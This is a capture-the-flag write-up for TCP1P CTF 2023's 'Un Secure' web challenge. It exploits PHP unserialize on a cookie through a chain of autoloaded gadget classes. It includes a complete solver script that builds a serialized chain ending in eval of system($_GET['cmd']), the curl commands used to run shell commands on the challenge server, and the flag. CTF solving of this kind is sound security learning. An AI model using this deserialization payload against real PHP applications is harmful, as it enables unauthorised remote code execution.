# Un Secure

## Description

> Tag: web, php, unserialize
>
> Do you know what "unserialize" means? In PHP, unserialize is something that can be very dangerous, you know? It can cause Remote Code Execution. And if it's combined with an autoloader like in Composer, it can use gadgets in the autoloaded folder to achieve Remote Code Execution.
>
> <http://ctf.tcp1p.com:45678>
>
> Attachment: dist.zip

## Flag

TCP1P{unserialize in php go brrrrrrrr ouch}

## Solution

index.php

```php
<?php
require("vendor/autoload.php");

if (isset($_COOKIE['cookie'])) {
    $cookie = base64_decode($_COOKIE['cookie']);
    unserialize($cookie);
}

echo "Welcome to my web app!";
```

There is Insecure Deserialization vulnerability, so I see if I can use existing class for Gadget Chain.

Looking at interested autoload class:

- src/GadgetOne/Adders.php
- src/GadgetTwo/Echoers.php
- src/GadgetThree/Vuln.php

Since it is possible to execute arbitrary command in the `__toString()` method of `\GadgetThree\Vuln` class, so I develop Gadget Chain.

Gadget Chain:

1. call `__destruct()` of `\GadgetTwo\Echoers`
1. call `get_x()` of `\GadgetOne\Adders`
1. return instance of `\GadgetThree\Vuln`
1. call `__toString()` of `\GadgetThree\Vuln` because `echo` in `__destruct()` of `\GadgetTwo\Echoers`

solver.php

```php
<?php

namespace GadgetOne {
    class Adders
    {
        private $x;
        function __construct($x)
        {
            $this->x = $x;
        }
        // original:
        // function get_x()
        // {
        //     return $this->x;
        // }
    }
}

namespace GadgetThree {

    class Vuln
    {
        public $waf1 = 1;
        public $waf2 = "\xde\xad\xbe\xef";
        public $waf3 = false;
        public $cmd =  "system(\$_GET['cmd']);";

        // original:
        // function __toString()
        // {
        //     if (!($this->waf1 === 1)) {
        //         die("not x");
        //     }
        //     if (!($this->waf2 === "\xde\xad\xbe\xef")) {
        //         die("not y");
        //     }
        //     if (!($this->waf3) === false) {
        //         die("not z");
        //     }
        //     eval($this->cmd);
        // }
    }
}


namespace GadgetTwo {
    class Echoers
    {
        public $klass;

        // original:
        // function __destruct()
        // {
        //     echo $this->klass->get_x();
        // }
    }
}



namespace {
    $gdt3 = new \GadgetThree\Vuln();
    $gdt1 = new \GadgetOne\Adders($gdt3);

    $gdt2 = new \GadgetTwo\Echoers();
    $gdt2->klass = $gdt1;

    echo base64_encode(serialize($gdt2)) . PHP_EOL;
}
```

```console
root@kali:~/ctf/TCP1PCTF_2023/web/Un_Secure# cookie=$(php solver.php)

root@kali:~/ctf/TCP1PCTF_2023/web/Un_Secure# curl http://ctf.tcp1p.com:45678/?cmd=ls -H "Cookie: cookie=${cookie}"
182939124819238912571292389218129123.txt
composer.json
composer.lock
index.php
src
vendor
(snip)
root@kali:~/ctf/TCP1PCTF_2023/web/Un_Secure# curl http://ctf.tcp1p.com:45678/?cmd=cat+182939124819238912571292389218129123.txt -H "Cookie: cookie=${cookie}"
TCP1P{unserialize in php go brrrrrrrr ouch}
(snip)
```
